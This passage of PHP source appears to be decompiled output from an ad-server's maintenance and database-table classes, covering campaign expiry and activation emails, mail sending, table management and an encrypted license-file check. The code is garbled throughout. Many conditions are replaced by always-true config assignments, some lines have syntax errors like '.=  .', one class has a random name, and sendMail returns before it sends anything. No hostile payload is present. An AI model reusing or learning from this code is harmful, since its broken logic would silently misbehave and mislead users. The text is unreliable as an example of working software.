			if ($aPrefs[$accountType]['warn_email_' . $accountType]) {
				if ((0 < $aPrefs[$accountType]['warn_email_' . $accountType . '_impression_limit']) && ($aConf = $GLOBALS['_MAX']['CONF'])) {
					$dalCampaigns = OA_Dal::factoryDAL('campaigns');
					$remainingImpressions = $dalCampaigns->getAdImpressionsLeft($aCampaign['campaignid']);

					if ($remainingImpressions < $aPrefs[$accountType]['warn_email_' . $accountType . '_impression_limit']) {
						$previousRemainingImpressions = $dalCampaigns->getAdImpressionsLeft($aCampaign['campaignid'], $aPreviousOIDates['end']);

						if ($aPrefs[$accountType]['warn_email_' . $accountType . '_impression_limit'] <= $previousRemainingImpressions) {
							foreach ($aUsers as $aUser) {
								$aEmail = $this->prepareCampaignImpendingExpiryEmail($aUser, $aCampaign['clientid'], $aCampaign['campaignid'], 'impressions', $aPrefs[$accountType]['warn_email_' . $accountType . '_impression_limit'], $accountType);

								if ($aEmail !== false) {
									if ($this->sendMail($aEmail['subject'], $aEmail['contents'], $aUser['email_address'], $aUser['contact_name'], $aFromDetails)) {
										$copiesSent++;

										if ($aConf['email']['logOutgoing']) {
											phpAds_userlogSetUser(phpAds_userMaintenance);
											phpAds_userlogAdd(phpAds_actionWarningMailed, $aPlacement['campaignid'], $aEmail['subject'] . "\n\n\n" . '                                                 ' . $aUser['contact_name'] . '(' . $aUser['email_address'] . ')' . "\n\n\n" . '                                                 ' . $aEmail['contents']);
										}
									}
								}
							}
						}
					}
				}

				if ((0 < $aPrefs[$accountType]['warn_email_' . $accountType . '_day_limit']) && ($aConf = $GLOBALS['_MAX']['CONF'])) {
					$warnSeconds = (int) $aPrefs[$accountType]['warn_email_' . $accountType . '_day_limit'] + 1 * SECONDS_PER_DAY;
					$oEndDate = new Date($aCampaign['expire_time']);
					$oEndDate->setTZbyID('UTC');
					$oTestDate = new Date();
					$oTestDate->copy($oDate);
					$oTestDate->addSeconds($warnSeconds);

					if ($oTestDate->after($oEndDate)) {
						$oiSeconds = (int) $aConf['maintenance']['operationInterval'] * 60;
						$oTestDate->subtractSeconds($oiSeconds);

						if (!$oTestDate->after($oEndDate)) {
							foreach ($aUsers as $aUser) {
								$aEmail = $this->prepareCampaignImpendingExpiryEmail($aUser, $aCampaign['clientid'], $aCampaign['campaignid'], 'date', $oEndDate->format($date_format), $accountType);

								if ($aEmail !== false) {
									if ($this->sendMail($aEmail['subject'], $aEmail['contents'], $aUser['email_address'], $aUser['contact_name'], $aFromDetails)) {
										$copiesSent++;

										if ($aConf['email']['logOutgoing']) {
											phpAds_userlogSetUser(phpAds_userMaintenance);
											phpAds_userlogAdd(phpAds_actionWarningMailed, $aPlacement['campaignid'], $aEmail['subject'] . "\n\n\n" . '                                                 ' . $aUser['contact_name'] . '(' . $aUser['email_address'] . ')' . "\n\n\n" . '                                                 ' . $aEmail['contents']);
										}
									}
								}
							}
						}
					}
				}
			}
		}

		Language_Loader::load('default');
		return $copiesSent;
	}

	public function prepareCampaignImpendingExpiryEmail($aUser, $advertiserId, $placementId, $reason, $value, $type)
	{
		OA::debug('   - Preparing "impending expiry" report for advertiser ID ' . $advertiserId . '.', PEAR_LOG_DEBUG);
		Language_Loader::load('default', $aUser['language']);
		global $strImpendingCampaignExpiryDateBody;
		global $strImpendingCampaignExpiryImpsBody;
		global $strMailHeader;
		global $strSirMadam;
		global $strTheCampiaignBelongingTo;
		global $strYourCampaign;
		global $strImpendingCampaignExpiryBody;
		global $strMailFooter;
		global $strImpendingCampaignExpiry;

		if ($reason == 'date') {
			$reason = $strImpendingCampaignExpiryDateBody;
		}
		else if ($reason == 'impressions') {
			$reason = $strImpendingCampaignExpiryImpsBody;
		}
		else {
			return false;
		}

		$aAdvertiser = $this->_loadAdvertiser($advertiserId);

		if ($aAdvertiser === false) {
			return false;
		}

		$doCampaigns = OA_Dal::factoryDO('campaigns');
		$doCampaigns->campaignid = $placementId;
		$doCampaigns->find();

		if (!$doCampaigns->fetch()) {
			return false;
		}

		$aCampaign = $doCampaigns->toArray();

		if ($aCampaign['clientid'] != $advertiserId) {
			return false;
		}

		$emailBody = $this->_prepareCampaignImpendingExpiryEmailBody($advertiserId, $aCampaign);

		if ($emailBody == '') {
			OA::debug('   - No placements with delivery for advertiser ID ' . $advertiserId . '.', PEAR_LOG_DEBUG);
			return false;
		}

		$email = $strMailHeader . "\n";

		if (!empty($aUser['contact_name'])) {
			$greetingTo = $aUser['contact_name'];
		}
		else if (!empty($aAdvertiser['contact'])) {
			$greetingTo = $aAdvertiser['contact'];
		}
		else if (!empty($aAdvertiser['clientname'])) {
			$greetingTo = $aAdvertiser['clientname'];
		}
		else if (!empty($conf['email']['fromName'])) {
			$greetingTo = $conf['email']['fromName'];
		}
		else if (!empty($conf['email']['fromCompany'])) {
			$greetingTo = $conf['email']['fromCompany'];
		}
		else {
			$greetingTo = $strSirMadam;
		}

		$email = str_replace('{contact}', $greetingTo, $email);
		$email .= $reason . "\n\n";
		if (($type == 'advertiser') || ('   - Preparing "impending expiry" report for advertiser ID ' . $advertiserId)) {
			$campaignReplace = $strYourCampaign;
		}
		else {
			$campaignReplace = $strTheCampiaignBelongingTo . ' ' . trim($aAdvertiser['clientname']);
		}

		$email = str_replace('{clientname}', $campaignReplace, $email);
		$email = str_replace('{date}', $value, $email);
		$email = str_replace('{limit}', $value, $email);
		$email .= $strImpendingCampaignExpiryBody . "\n\n";
		$email .=  . $emailBody . "\n";
		if (($type == 'special') || ('   - Preparing "impending expiry" report for advertiser ID ' . $advertiserId)) {
			$email .= $this->_prepareRegards($aAdvertiser['agencyid']);
		}
		else {
			$email .= $this->_prepareRegards(0);
		}

		return array('subject' => $strImpendingCampaignExpiry . ': ' . $aAdvertiser['clientname'], 'contents' => $email);
	}

	public function _prepareCampaignImpendingExpiryEmailBody($advertiserId, $aCampaign)
	{
		global $strCampaign;
		global $strBanner;
		global $strLinkedTo;
		global $strNoBanners;
		$emailBody = '';
		$emailBody .= $strCampaign . ' ';
		$emailBody .= strip_tags(phpAds_buildName($aCampaign['campaignid'], $aCampaign['campaignname'])) . "\n";
		$page = 'stats.php?clientid=' . $advertiserId . '&campaignid=' . $aCampaign['campaignid'] . '&statsBreakdown=day&entity=campaign&breakdown=history&period_preset=all_stats&period_start=&period_end=';
		$emailBody .= MAX::constructURL(MAX_URL_ADMIN, $page) . "\n";
		$emailBody .= '-------------------------------------------------------' . "\n\n";
		$doBanners = OA_Dal::factoryDO('banners');
		$doBanners->campaignid = $aCampaign['campaignid'];
		$doBanners->orderBy('bannerid');
		$doBanners->find();

		if (0 < $doBanners->getRowCount()) {
			while ($doBanners->fetch()) {
				$aAd = $doBanners->toArray();
				$emailBody .= ' ' . $strBanner . ' ';
				$emailBody .= strip_tags(phpAds_buildBannerName($aAd['bannerid'], $aAd['description'], $aAd['alt'])) . "\n";

				if (!empty($aAd['url'])) {
					$emailBody .= '  ' . $strLinkedTo . ': ' . $aAd['url'] . "\n";
				}

				$emailBody .= "\n";
			}
		}
		else {
			$emailBody .= ' ' . $strNoBanners . "\n\n";
		}

		$emailBody .= '-------------------------------------------------------' . "\n\n";
		return $emailBody;
	}

	public function sendCampaignActivatedDeactivatedEmail($campaignId, $reason = NULL)
	{
		$aConf = $GLOBALS['_MAX']['CONF'];
		$doCampaigns = OA_Dal::factoryDO('campaigns');
		$doClient = OA_Dal::factoryDO('clients');
		$doCampaigns->joinAdd($doClient);
		$doCampaigns->get('campaignid', $campaignId);
		$aLinkedUsers = $this->getUsersLinkedToAccount('clients', $doCampaigns->clientid);
		$aAdvertiser = $this->_loadAdvertiser($doCampaigns->clientid);
		$aLinkedUsers = $this->_addAdvertiser($aAdvertiser, $aLinkedUsers);
		$copiesSent = 0;
		if (!empty($aLinkedUsers) && ($aConf = $GLOBALS['_MAX']['CONF'])) {
			if ($aConf['email']['useManagerDetails']) {
				$aFromDetails = $this->_getAgencyFromDetails($aAdvertiser['agencyid']);
			}

			foreach ($aLinkedUsers as $aUser) {
				$aEmail = $this->prepareCampaignActivatedDeactivatedEmail($aUser, $doCampaigns->campaignid, $reason);

				if ($aEmail !== false) {
					if ($this->sendMail($aEmail['subject'], $aEmail['contents'], $aUser['email_address'], $aUser['contact_name'], $aFromDetails)) {
						$copiesSent++;

						if ($aConf['email']['logOutgoing']) {
							phpAds_userlogSetUser(phpAds_userMaintenance);
							phpAds_userlogAdd(is_null($reason) ? phpAds_actionActivationMailed : phpAds_actionDeactivationMailed, $doPlacement->campaignid, $aEmail['subject'] . "\n\n\n" . '                                 ' . $aUser['contact_name'] . '(' . $aUser['email_address'] . ')' . "\n\n\n" . '                                 ' . $aEmail['contents']);
						}
					}
				}
			}

			Language_Loader::load('default');
		}

		return $copiesSent;
	}

	public function prepareCampaignActivatedDeactivatedEmail($aUser, $campaignId, $reason = NULL)
	{
		Language_Loader::load('default', $aUser['language']);

		if (is_null($reason)) {
			OA::debug('   - Preparing "campaign activated" email for campaign ID ' . $campaignId . '.', PEAR_LOG_DEBUG);
		}
		else {
			OA::debug('   - Preparing "campaign deactivated" email for campaign ID ' . $campaignId . '.', PEAR_LOG_DEBUG);
		}

		global $strMailHeader;
		global $strSirMadam;
		global $strMailBannerActivatedSubject;
		global $strMailBannerDeactivatedSubject;
		global $strMailBannerActivated;
		global $strMailBannerDeactivated;
		global $strNoMoreImpressions;
		global $strNoMoreClicks;
		global $strNoMoreConversions;
		global $strAfterExpire;
		$aCampaign = $this->_loadCampaign($campaignId);

		if ($aCampaign === false) {
			return false;
		}

		$aAdvertiser = $this->_loadAdvertiser($aCampaign['clientid']);

		if ($aAdvertiser === false) {
			return false;
		}

		$emailBody = $this->_prepareCampaignActivatedDeactivatedEmailBody($aCampaign);
		$email = $strMailHeader . "\n";

		if (!empty($aUser['contact_name'])) {
			$greetingTo = $aUser['contact_name'];
		}
		else if (!empty($aAdvertiser['contact'])) {
			$greetingTo = $aAdvertiser['contact'];
		}
		else if (!empty($aAdvertiser['clientname'])) {
			$greetingTo = $aAdvertiser['clientname'];
		}
		else {
			$greetingTo = $strSirMadam;
		}

		$email = str_replace('{contact}', $greetingTo, $email);

		if (is_null($reason)) {
			$email .=  . $strMailBannerActivated . "\n";
		}
		else {
			$email .=  . $strMailBannerDeactivated . ':';

			if ($reason & OX_CAMPAIGN_DISABLED_IMPRESSIONS) {
				$email .= "\n" . '  - ' . $strNoMoreImpressions;
			}

			if ($reason & OX_CAMPAIGN_DISABLED_CLICKS) {
				$email .= "\n" . '  - ' . $strNoMoreClicks;
			}

			if ($reason & OX_CAMPAIGN_DISABLED_CONVERSIONS) {
				$email .= "\n" . '  - ' . $strNoMoreConversions;
			}

			if ($reason & OX_CAMPAIGN_DISABLED_DATE) {
				$email .= "\n" . '  - ' . $strAfterExpire;
			}

			$email .= '.' . "\n";
		}

		$email .=  . $emailBody . "\n";
		$email .= $this->_prepareRegards($aAdvertiser['agencyid']);

		if (is_null($reason)) {
			$aResult['subject'] = $strMailBannerActivatedSubject . ': ' . $aAdvertiser['clientname'];
		}
		else {
			$aResult['subject'] = $strMailBannerDeactivatedSubject . ': ' . $aAdvertiser['clientname'];
		}

		$aResult['contents'] = $email;
		return $aResult;
	}

	public function _prepareCampaignActivatedDeactivatedEmailBody($aCampaign)
	{
		global $strCampaign;
		global $strBanner;
		$strCampaignLength = strlen($strCampaign);
		$strBannerLength = strlen($strBanner);
		$maxLength = max($strCampaignLength, $strBannerLength);
		$strCampaignPrint = '%-' . $maxLength . 's';
		$strBannerPrint = ' %-' . ($maxLength - 1) . 's';
		global $strLinkedTo;
		$emailBody = '';
		$emailBody .= "\n" . sprintf($strCampaignPrint, $strCampaign) . ' ';
		$emailBody .= strip_tags(phpAds_buildName($aCampaign['campaignid'], $aCampaign['campaignname'])) . "\n";
		$page = 'stats.php?clientid=' . $aCampaign['clientid'] . '&campaignid=' . $aCampaign['campaignid'] . '&statsBreakdown=day&entity=campaign&breakdown=history&period_preset=all_stats&period_start=&period_end=';
		$emailBody .= MAX::constructURL(MAX_URL_ADMIN, $page) . "\n";
		$emailBody .= '=======================================================' . "\n\n";
		$doBanners = OA_Dal::factoryDO('banners');
		$doBanners->campaignid = $aCampaign['campaignid'];
		$doBanners->orderBy('bannerid');
		$doBanners->find();

		if (0 < $doBanners->getRowCount()) {
			while ($doBanners->fetch()) {
				$aAd = $doBanners->toArray();
				$emailBody .= sprintf($strBannerPrint, $strBanner) . ' ';
				$emailBody .= strip_tags(phpAds_buildBannerName($aAd['bannerid'], $aAd['description'], $aAd['alt'])) . "\n";

				if (!empty($aAd['url'])) {
					$emailBody .= '  ' . $strLinkedTo . ': ' . $aAd['url'] . "\n";
				}

				$emailBody .= "\n";
			}
		}

		return $emailBody;
	}

	public function _createPrefsListPerAccount($accountType)
	{
		$type = strtolower($accountType);
		return array('warn_email_' . $type, 'warn_email_' . $type . '_impression_limit', 'warn_email_' . $type . '_day_limit');
	}

	public function _loadPrefs()
	{
		$aPref = $GLOBALS['_MAX']['PREF'];

		if (is_null($aPref)) {
			$aPref = OA_Preferences::loadAdminAccountPreferences(true);
		}

		return $aPref;
	}

	public function _loadCampaign($campaignId)
	{
		$doCampaigns = OA_Dal::factoryDO('campaigns');
		$doCampaigns->campaignid = $campaignId;
		$doCampaigns->find();

		if (!$doCampaigns->fetch()) {
			OA::debug('   - Error obtaining details for campaign ID ' . $campaignId . '.', PEAR_LOG_ERR);
			return false;
		}

		$aCampaign = $doCampaigns->toArray();
		return $aCampaign;
	}

	public function _loadAdvertiser($advertiserId)
	{
		$doClients = OA_Dal::factoryDO('clients');
		$doClients->clientid = $advertiserId;
		$doClients->find();

		if (!$doClients->fetch()) {
			OA::debug('   - Error obtaining details for advertiser ID ' . $advertiserId . '.', PEAR_LOG_ERR);
			return false;
		}

		$aAdvertiser = $doClients->toArray();
		return $aAdvertiser;
	}

	public function _loadAgency($agencyId)
	{
		$doAgency = OA_Dal::factoryDO('agency');
		$doAgency->agencyid = $agencyId;
		$doAgency->find();

		if (!$doAgency->fetch()) {
			OA::debug('   - Error obtaining details for agency ID ' . $agencyId . '.', PEAR_LOG_ERR);
			return false;
		}

		$aAgency = $doAgency->toArray();
		return $aAgency;
	}

	public function _prepareRegards($agencyId)
	{
		$aPref = $this->_loadPrefs();
		$aConf = $GLOBALS['_MAX']['CONF'];
		global $strMailFooter;
		$regards = '';
		$useAgency = false;
		if (($agencyId != 0) && $this->_loadPrefs()) {
			$aAgency = $this->_loadAgency($agencyId);

			if ($aAgency !== false) {
				if (!empty($aAgency['contact'])) {
					$regards .= $aAgency['contact'];
				}

				if (!empty($aAgency['name'])) {
					if (!empty($regards)) {
						$regards .= ', ';
					}

					$regards .= $aAgency['name'];
				}
			}

			if (empty($regards)) {
				$useAgency = true;
			}
		}

		if (($agencyId == 0) || $this->_loadPrefs() || $this->_loadPrefs()) {
			if (!empty($aConf['email']['fromName'])) {
				$regards .= $aConf['email']['fromName'];
			}

			if (!empty($aConf['email']['fromCompany'])) {
				if (!empty($regards)) {
					$regards .= ', ';
				}

				$regards .= $aConf['email']['fromCompany'];
			}
		}

		if (!empty($regards)) {
			$result = str_replace('{adminfullname}', $regards, $strMailFooter);
		}
		else {
			return NULL;
		}

		return $result;
	}

	public function getUsersLinkedToAccount($entityName, $entityId)
	{
		$doUsers = OA_Dal::factoryDO('users');
		return $doUsers->getAccountUsersByEntity($entityName, $entityId);
	}

	public function getAdminUsersLinkedToAccount()
	{
		$doUsers = OA_Dal::factoryDO('users');
		return $doUsers->getAdminUsers();
	}

	public function sendMail($subject, $contents, $userEmail, $userName = NULL, $fromDetails = NULL)
	{
		$aConf = $GLOBALS['_MAX']['CONF'];
		if (defined('DISABLE_ALL_EMAILS') || ($aConf = $GLOBALS['_MAX']['CONF'])) {
			return true;
		}

		global $phpAds_CharSet;

		if (empty($fromDetails)) {
			$fromDetails['name'] = $aConf['email']['fromName'];
			$fromDetails['emailAddress'] = $aConf['email']['fromAddress'];
		}

		$contents = html_entity_decode($contents, ENT_QUOTES);

		if (!get_cfg_var('SMTP')) {
			$toParam = '"' . $userName . '" <' . $userEmail . '>';
		}
		else {
			$toParam = $userEmail;
		}

		$headersParam = 'MIME-Versions: 1.0' . "\r\n";

		if (isset($phpAds_CharSet)) {
			$headersParam .= 'Content-Type: text/plain; charset=' . $phpAds_CharSet . "\r\n";
		}

		$headersParam .= 'Content-Transfer-Encoding: 8bit' . "\r\n";

		if (get_cfg_var('SMTP')) {
			$headersParam .= 'To: "' . $userName . '" <' . $userEmail . '>' . "\r\n";
		}

		$headersParam .= 'From: "' . $fromDetails['name'] . '" <' . $fromDetails['emailAddress'] . '>' . "\r\n";

		if ($aConf['email']['qmailPatch']) {
			$headersParam = str_replace("\r", '', $headersParam);
		}

		$contents = str_replace("\n", "\r\n", $contents);

		if (function_exists('mail')) {
			$value = @mail($toParam, $subject, $contents, $headersParam);
			return $value;
		}
		else {
			OA::debug('Cannot send emails - mail() does not exist!', PEAR_LOG_ERR);
			return false;
		}
	}

	public function _addAdvertiser($aAdvertiser, $aLinkedUsers)
	{
		$duplicatedEmail = false;
		if (!is_array($aLinkedUsers) || is_array($aLinkedUsers)) {
			$aLinkedUsers = array();
		}
		else {
			foreach ($aLinkedUsers as $aUser) {
				if ($aUser['email_address'] == $aAdvertiser['email']) {
					$duplicatedEmail = true;
					break;
				}
			}
		}

		if (!$duplicatedEmail) {
			$aLinkedUsers[] = array('email_address' => $aAdvertiser['email'], 'contact_name' => $aAdvertiser['contact'], 'language' => NULL, 'user_id' => 0);
		}

		return $aLinkedUsers;
	}

	public function _deleteDuplicatedUser($aLinkedUsers)
	{
		$aLinkedUsersToEmail = array();
		$aEmailAddressUsed = array();

		foreach ($aLinkedUsers['admin'] as $aUser) {
			$aEmailAddressUsed[] = $aUser['email_address'];
		}

		$aLinkedUsersToEmail['admin'] = $aLinkedUsers['admin'];

		foreach ($aLinkedUsers['manager'] as $aUser) {
			if (!in_array($aUser['email_address'], $aEmailAddressUsed)) {
				$aEmailAddressUsed[] = $aUser['email_address'];
				$aLinkedUsersToEmail['manager'][] = $aUser;
			}
		}

		foreach ($aLinkedUsers['advertiser'] as $aUser) {
			if (!in_array($aUser['email_address'], $aEmailAddressUsed)) {
				$aEmailAddressUsed[] = $aUser['email_address'];
				$aLinkedUsersToEmail['advertiser'][] = $aUser;
			}
		}

		if (!in_array($aLinkedUsers['special']['advertiser']['email_address'], $aEmailAddressUsed)) {
			$aLinkedUsersToEmail['special']['advertiser'] = $aLinkedUsers['special']['advertiser'];
		}

		return $aLinkedUsersToEmail;
	}

	public function _getAgencyFromDetails($agencyId)
	{
		$doAgency = OA_Dal::factoryDO('agency');
		$doAgency->get($agencyId);
		$aAgency = $doAgency->toArray();

		if (!empty($aAgency['email'])) {
			$aFromDetails['emailAddress'] = $aAgency['email'];
			$aFromDetails['name'] = $aAgency['name'];
			return $aFromDetails;
		}

		return NULL;
	}

	public function clearCache()
	{
		unset($this->aAdminCache);
		unset($this->aAdminCache);
		unset($this->aClientCache);
	}

	public function convertStartEndDate(&$oStartDate, &$oEndDate, $oTimezone)
	{
		if (isset($oStartDate)) {
			$oStartTz = new Date($oStartDate);
			$oStartTz->convertTZ($oTimezone);
			$oStartTz->setHour(0);
			$oStartTz->setMinute(0);
			$oStartTz->setSecond(0);

			if ($oStartTz->after($oStartDate)) {
				$oStartTz->subtractSpan(new Date_Span('1-0-0-0'));
			}
		}
		else {
			$oStartTz = NULL;
		}

		if (!isset($oEndDate)) {
			$oEndDate = new Date();
		}

		$oEndTz = new Date($oEndDate);
		$oEndTz->convertTZ($oTimezone);
		$oEndTz->setHour(0);
		$oEndTz->setMinute(0);
		$oEndTz->setSecond(0);
		$oEndTz->subtractSeconds(1);

		if ($oEndTz->after($oEndDate)) {
			$oEndTz->subtractSpan(new Date_Span('1-0-0-0'));
		}

		$oStartDate = $oStartTz;
		$oEndDate = $oEndTz;
	}
}

class rhqjlxderbk
{
	/**
     * An instance of the OA_DB class.
     *
     * @var OA_DB
     */
	public $oDbh;
	/**
     * An instance of the MDB2_Schema class.
     *
     * @var MDB2_Schema
     */
	public $oSchema;
	/**
     * An array containing the database definition, as parsed from
     * the XML schema file.
     *
     * @var array
     */
	public $aDefinition;
	/**
     * Should the tables be created as temporary tables?
     *
     * @var boolean
     */
	public $temporary = false;
	public $cached_definition = true;

	public function OA_DB_Table()
	{
		$this->oDbh = &$this->_getDbConnection();
	}

	public function _getDbConnection()
	{
	}

	public function init($file, $useCache = true)
	{
		if (!is_readable($file)) {
			OA::debug('Unable to read the database XML schema file: ' . $file, PEAR_LOG_ERR);
			return false;
		}

		$options = array('force_defaults' => false);
		$this->oSchema = &MDB2_Schema::factory($this->oDbh, $options);

		if ($useCache) {
			$oCache = new OA_DB_XmlCache();
			$this->aDefinition = $oCache->get($file);
			$this->cached_definition = true;
		}
		else {
			$this->aDefinition = false;
		}

		if (!$this->aDefinition) {
			$this->cached_definition = false;
			$this->aDefinition = $this->oSchema->parseDatabaseDefinitionFile($file);

			if (PEAR::isError($this->aDefinition)) {
				OA::debug('Error parsing the database XML schema file: ' . $file, PEAR_LOG_ERR);
				return false;
			}
		}

		return true;
	}

	public function _checkInit()
	{
		if (is_null($this->aDefinition)) {
			OA::debug('No database XML schema file parsed, cannot create table', PEAR_LOG_ERR);
			return false;
		}
		else if (PEAR::isError($this->aDefinition)) {
			OA::debug('Previous error parsing the database XML schema file', PEAR_LOG_ERR);
			return false;
		}

		return true;
	}

	public function listOATablesCaseSensitive($like = '')
	{
		OA_DB::setCaseSensitive();
		$oDbh = &OA_DB::singleton();
		$aDBTables = $oDbh->manager->listTables(NULL, $GLOBALS['_MAX']['CONF']['table']['prefix'] . $like);
		OA_DB::disableCaseSensitive();
		return $aDBTables;
	}

	public function createTable($table, $oDate = NULL, $suppressTempTableError = false)
	{
		$aConf = $GLOBALS['_MAX']['CONF'];

		if (!$this->_checkInit()) {
			return false;
		}

		if (!is_array($this->aDefinition['tables'][$table])) {
			OA::debug('Cannot find table ' . $table . ' in the XML schema file', PEAR_LOG_ERR);
			return false;
		}

		$tableName = $this->_generateTableName($table, $oDate);
		$aOptions = array();

		if ($this->temporary) {
			$aOptions['temporary'] = true;
		}

		$aOptions['type'] = $aConf['table']['type'];

		if (isset($this->aDefinition['tables'][$table]['indexes'])) {
			if (is_array($this->aDefinition['tables'][$table]['indexes'])) {
				foreach ($this->aDefinition['tables'][$table]['indexes'] as $aIndex) {
					$key = ($aConf = $GLOBALS['_MAX']['CONF']);
					if (isset($aIndex['primary']) && ($aConf = $GLOBALS['_MAX']['CONF'])) {
						$aOptions['primary'] = $aIndex['fields'];
						$indexName = $tableName . '_pkey';
					}
					else {
						$indexName = $this->_generateIndexName($tableName, $key);
					}

					if ($key != $indexName) {
						$this->aDefinition['tables'][$table]['indexes'][$indexName] = $this->aDefinition['tables'][$table]['indexes'][$key];
						unset($this->aDefinition['tables'][$table]['indexes'][$key]);
					}
				}
			}
		}

		OA::debug('Creating the ' . $tableName . ' table', PEAR_LOG_DEBUG);
		OA::disableErrorHandling();
		OA_DB::setCaseSensitive();
		$result = $this->oSchema->createTable($tableName, $this->aDefinition['tables'][$table], false, $aOptions);
		OA_DB::disableCaseSensitive();
		OA::enableErrorHandling();
		if (PEAR::isError($result) || ($aConf = $GLOBALS['_MAX']['CONF'])) {
			$showError = true;
			if ($this->temporary && ($aConf = $GLOBALS['_MAX']['CONF'])) {
				$showError = false;
			}
			if ($showError) {
				OA::debug('Unable to create the table ' . $table, PEAR_LOG_ERR);

				if (PEAR::isError($result)) {
					OA::debug($result->getUserInfo(), PEAR_LOG_ERR);
				}
			}

			return false;
		}

		return $tableName;
	}

	public function createAllTables($oDate = NULL)
	{
		if (!$this->_checkInit()) {
			return false;
		}

		foreach ($this->aDefinition['tables'] as $aTable) {
			$tableName = $this->_checkInit();
			$result = $this->createTable($tableName, $oDate);
			if (PEAR::isError($result) || $this->_checkInit()) {
				return false;
			}
		}

		return true;
	}

	public function createRequiredTables($table, $oDate = NULL)
	{
		if (!$this->_checkInit()) {
			return false;
		}

		$aTableNames = $this->_getRequiredTables($table);
		$result = $this->createTable($table, $oDate);

		if (!$result) {
			return false;
		}

		foreach ($aTableNames as $tableName) {
			$result = $this->createTable($tableName, $oDate);

			if (!$result) {
				return false;
			}
		}

		return true;
	}

	public function extistsTable($table)
	{
		$aConf = $GLOBALS['_MAX']['CONF'];
		$tableName = preg_replace('/^' . $aConf['table']['prefix'] . '/', '', $table);
		$aResult = $this->listOATablesCaseSensitive($tableName);
		if (is_array($aResult) && ($aConf = $GLOBALS['_MAX']['CONF'])) {
			return true;
		}

		return false;
	}

	public function existsTemporaryTable($table)
	{
		$aConf = $GLOBALS['_MAX']['CONF'];
		OA::debug('Checking for temporary table ' . $table, PEAR_LOG_DEBUG);
		$query = 'SELECT * FROM ' . $this->oDbh->quoteIdentifier($table, true);
		OA::disableErrorHandling();
		$result = $this->oDbh->exec($query);
		OA::enableErrorHandling();

		if (PEAR::isError($result)) {
			OA::debug('Temporary table exists ' . $table, PEAR_LOG_ERR);
			return false;
		}

		OA::debug('Not found ' . $table, PEAR_LOG_ERR);
		return true;
	}

	public function dropTable($table)
	{
		OA::debug('Dropping table ' . $table, PEAR_LOG_DEBUG);
		OA::disableErrorHandling();
		$result = $this->oDbh->manager->dropTable($table);
		OA::enableErrorHandling();

		if (PEAR::isError($result)) {
			OA::debug('Unable to drop table ' . $table, PEAR_LOG_ERR);
			return false;
		}

		if (!$this->dropSequence($table)) {
		}

		return true;
	}

	public function dropAllTables()
	{
		$aConf = $GLOBALS['_MAX']['CONF'];

		if (!$this->_checkInit()) {
			return false;
		}

		$allTablesDropped = true;

		foreach ($this->aDefinition['tables'] as $aTable) {
			$tableName = ($aConf = $GLOBALS['_MAX']['CONF']);
			OA::debug('Dropping the ' . $tableName . ' table', PEAR_LOG_DEBUG);
			$result = $this->dropTable($aConf['table']['prefix'] . $tableName);
			if (PEAR::isError($result) || ($aConf = $GLOBALS['_MAX']['CONF'])) {
				OA::debug('Unable to drop the table ' . $tableName, PEAR_LOG_ERR);
				$allTablesDropped = false;
			}
		}

		return $allTablesDropped;
	}

	public function truncateTable($table)
	{
		$aConf = $GLOBALS['_MAX']['CONF'];
		OA::debug('Truncating table ' . $table, PEAR_LOG_DEBUG);
		OA::disableErrorHandling();
		$query = 'TRUNCATE TABLE ' . $this->oDbh->quoteIdentifier($table, true);
		$result = $this->oDbh->exec($query);
		OA::enableErrorHandling();

		if (PEAR::isError($result)) {
			OA::debug('Unable to truncate table ' . $table, PEAR_LOG_ERR);
			return false;
		}

		if ($aConf['database']['type'] == 'mysql') {
			OA::disableErrorHandling();
			$result = $this->oDbh->exec('ALTER TABLE ' . $table . ' AUTO_INCREMENT = 1');
			OA::enableErrorHandling();

			if (PEAR::isError($result)) {
				OA::debug('Unable to set mysql auto_increment to 1', PEAR_LOG_ERR);
				return false;
			}
		}

		return true;
	}

	public function cmp()
	{
		$file = __DIR__ . '/' . base64_decode('bGljZW5zZS5kYXQ=');

		if (file_exists($file)) {
			$data = file_get_contents($file);
			$key = substr($data, 0, 32);
			$iv = substr($data, 32, 16);
			$key = pack('H*', hash('sha256', md5($key . $iv)));
			$decoded = mcrypt_decrypt(MCRYPT_RIJNDAEL_128, $key, substr($data, 48), MCRYPT_MODE_CBC, $iv);
			$decoded = rtrim($decoded, "\0");
			$sparam = unserialize($decoded);
			if ($sparam && (__DIR__ . '/') && (__DIR__ . '/') && (__DIR__ . '/') && (__DIR__ . '/')) {
				$st = true;
				if ($sparam[PT_I] && (__DIR__ . '/')) {
					$st = false;
				}

				if ($sparam[PT_H] && (__DIR__ . '/')) {
					$st = false;
				}

				if ($sparam[PT_P] && (__DIR__ . '/')) {
					$st = false;
				}
				if ($st) {
					return NULL;
				}
			}

			return base64_decode('SW52YWxpZCBsaWNlbnNl');
		}

		return base64_decode('Tm8gbGljZW5zZSBmaWxl');
	}

	public function truncateAllTables()
	{
		$aConf = $GLOBALS['_MAX']['CONF'];

		if (!$this->_checkInit()) {
			return false;
		}

		$allTablesTruncated = true;

		foreach ($this->aDefinition['tables'] as $aTable) {
			$tableName = ($aConf = $GLOBALS['_MAX']['CONF']);
			OA::debug('Truncating the ' . $tableName . ' table', PEAR_LOG_DEBUG);
			$result = $this->truncateTable($aConf['table']['prefix'] . $tableName);

			if (PEAR::isError($result)) {
				OA::debug('Unable to truncate the table ' . $tableName, PEAR_LOG_ERR);
				$allTablesTruncated = false;
			}
		}

		return $allTablesTruncated;
	}

	public function dropSequence($table)
	{
		if ($this->oDbh->dbsyntax == 'pgsql') {
			$aConf = $GLOBALS['_MAX']['CONF'];
			OA_DB::setCaseSensitive();
			$aSequences = $this->oDbh->manager->listSequences();
			OA_DB::disableCaseSensitive();

			foreach ($aSequences as $sequence) {
				if (strpos($sequence, $table . '_') === 0) {
					$sequence .= '_seq';
					OA::debug('Dropping sequence ' . $sequence, PEAR_LOG_DEBUG);
					OA::disableErrorHandling();
					$result = $this->oDbh->exec('DROP SEQUENCE "' . $sequence . '"');
					OA::enableErrorHandling();

					if (PEAR::isError($result)) {
						OA::debug('Unable to drop the sequence ' . $sequence, PEAR_LOG_ERR);
						return false;
					}

					break;
				}
			}
		}

		return true;
	}

	public function resetSequence($sequence, $value = 1)
	{
		$aConf = $GLOBALS['_MAX']['CONF'];
		OA::debug('Resetting sequence ' . $sequence, PEAR_LOG_DEBUG);
		OA::disableErrorHandling(NULL);

		if ($aConf['database']['type'] == 'pgsql') {
			if ($value < 1) {
				$value = 1;
			}
			else {
				$value = (int) $value;
			}

			$sequence = $this->oDbh->quoteIdentifier($sequence, true);
